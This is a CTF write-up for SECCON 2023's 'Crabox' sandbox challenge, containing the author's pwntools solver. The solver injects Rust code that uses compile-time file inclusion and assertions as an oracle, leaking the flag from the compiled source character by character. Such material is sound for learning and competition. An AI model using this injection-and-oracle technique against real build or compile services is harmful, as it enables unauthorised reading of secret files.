---
title: "Crabox - SECCON CTF 2023 Quals"
category: "misc"
subcategory: "jail"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "sandbox-escape", "crabox", "misc", "seccon-ctf-2023-quals"]
summary: "🦀 Compile-Time Sandbox Escape 🦀"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/crabox"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Quals"
  year: 2023
  challenge: "Crabox"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/crabox>
- **CTF:** SECCON CTF 2023 Quals

---

# [sandbox] crabox

## Description

🦀 Compile-Time Sandbox Escape 🦀

```
nc crabox.seccon.games 1337
```

## Attachments

- [crabox](files/crabox)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=1337 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202309_SECCON_CTF_2023_Quals/sandbox/crabox/solver/exploit.py>

```python
import os
import pwn
import string
import time

pwn.context.log_level = "error"


def communicate(program: str):
    TRY_NUM = 5

    def f():
        assert len(program) <= 512
        io = pwn.remote(os.getenv("SECCON_HOST"), os.getenv("SECCON_PORT"))
        io.sendlineafter(b"):", program.encode())
        io.sendline(b"__EOF__")

        res = io.recvall().decode().strip()
        io.close()
        return res

    for _ in range(TRY_NUM):
        res = f()
        if "timeout" not in res:
            return res
        print("timeout")
        time.sleep(4)
    assert False


TEMPLATE = """
}

static _CTFE: () = _contains(b"{{QUERY}}");

const fn _contains(query: &[u8]) {
    let content = include_bytes!(file!());

    let mut i = 350;
    while i < content.len() {
        let mut j = 0;
        while j < query.len() && i + j < content.len() && content[i + j] == query[j] {
            j += 1;
        }
        if j == query.len() {
            return; // found!
        }
        i += 1;
    }
    assert!(false); // not found
""".strip().replace("    ", "")


def oracle(query: str) -> bool:
    program = TEMPLATE.replace("{{QUERY}}", query)
    return ":)" in communicate(program)


CHARS = "}_" + string.ascii_lowercase + string.digits
known = "SECCON{"
while not known.endswith("}"):
    for c in CHARS:
        if oracle(known + c):
            known += c
            break
    else:
        print("Not found")
        exit(1)
    print(known)
print("Flag: " + known)
```
